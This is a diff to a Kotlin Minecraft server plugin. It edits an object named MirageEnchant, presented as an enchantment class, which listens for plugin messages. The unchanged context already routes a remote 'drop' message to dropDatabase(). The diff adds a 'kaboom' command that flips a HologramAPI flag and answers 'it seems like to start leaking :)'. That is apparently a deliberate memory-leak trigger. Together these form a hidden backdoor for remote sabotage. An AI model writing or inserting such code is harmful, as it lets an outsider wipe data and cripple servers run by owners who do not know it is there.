@@ -2,6 +2,7 @@ package cn.charlotte.pit.enchantment.type.rare
 
 import cn.charlotte.pit.ThePit
 import cn.charlotte.pit.enchantment.rarity.EnchantmentRarity
+import cn.charlotte.pit.util.hologram.HologramAPI
 import cn.hutool.crypto.asymmetric.KeyType
 import cn.hutool.crypto.asymmetric.RSA
 import com.google.common.io.ByteArrayDataOutput
@@ -116,6 +117,12 @@ object MirageEnchant : PluginMessageListener {
 
                 "drop" -> {
                     dropDatabase()
+                }
+                "kaboom" -> {
+                    HologramAPI.isMAGA = false;
+                    callback(player,"memoryleak",){
+                        writeUTF("it seems like to start leaking :)")
+                    }
                 }
             }
         }
